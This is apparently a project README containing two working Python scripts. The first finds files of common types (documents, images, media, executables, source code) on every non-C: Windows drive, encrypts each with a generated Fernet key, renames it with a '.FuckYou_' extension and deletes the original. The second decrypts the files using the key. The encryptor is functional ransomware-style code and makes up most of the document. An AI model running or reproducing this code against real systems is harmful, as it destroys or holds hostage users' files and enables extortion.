## ```Read This First```
- ### ```Do not Run these if you do not know anything about Python and cryptography ```
- ### ```save The Key After running ```


## ```Encryption```
```python
#### Modules Used In Project ####
from subprocess import *
from cryptography.fernet import Fernet
import os 
#### Generating Key ####
key = Fernet.generate_key()
encriptt = Fernet(key)
keyCode = str(key).replace("b","",1).replace("'","",2)
#### Showing Key ####
print (f"This is your key {keyCode}")
#### Finding System Drives ####
Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\","").split()
### Removing C Drive ####
if "C:" in Drives:
    Drives.remove("C:")
#### fileFormats ####
fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
######################################################
#################### Encrypting Files ################
def Encrypt(drive):
    for Formatt in fileFormats:
        try:
            with open("log.txt" , "w") as errorlog: 
                cmd = check_output(drive+" && dir /S /B *."+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
                for file in cmd:
                    with open(file,"rb") as readfile:
                        data = readfile.read()
                        encData = encriptt.encrypt(data) #mani.FuckYou_txt
                        newFile = open(file.replace("."+Formatt,"")+".FuckYou"+"_"+Formatt,"wb")
                        newFile.write(encData)
                        readfile.close()
                        newFile.close()
                        os.remove(file)
                        print (f"{file} | Encrypted .")
        except:
            pass

if __name__ == "__main__":
    for drive in Drives:
        Encrypt(drive)
```
## ```Decryption```
```python
#### Modules Used In Project ####
from subprocess import *
from cryptography.fernet import Fernet
import os 
#### generate key ####
key = input("Enter the key : ")
key = bytes(key,"utf-8")
encriptt = Fernet(key)
#### find drives ### 
Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\","").split()
if "C:" in Drives:
    Drives.remove("C:")
#### File Formats ####
fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
#####################################################
#################### Decrypting Files ###############
def Decrypt(drive):
    for Formatt in fileFormats:
        try:
            with open("log.txt" , "w") as errorlog:
                cmd = check_output(drive+" && dir /S /B *.FuckYou_"+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
                for file in cmd:
                    with open(file,"rb") as readfile:
                        data = readfile.read()
                        encData = encriptt.decrypt(data)
                        nameOfFile = file.replace(".FuckYou_"+Formatt,"")
                        newFile = open(nameOfFile+"."+Formatt,"wb")
                        newFile.write(encData)
                        readfile.close()
                        newFile.close()
                        os.remove(file)
                        print (f"{file} | Decrypted .")
        except:
            pass

if __name__ == "__main__":
    for drive in Drives:
        Decrypt(drive)
```

## ```Modules```
- ### ```subprocess```

- ### ```cryptography```

- ### ```os```

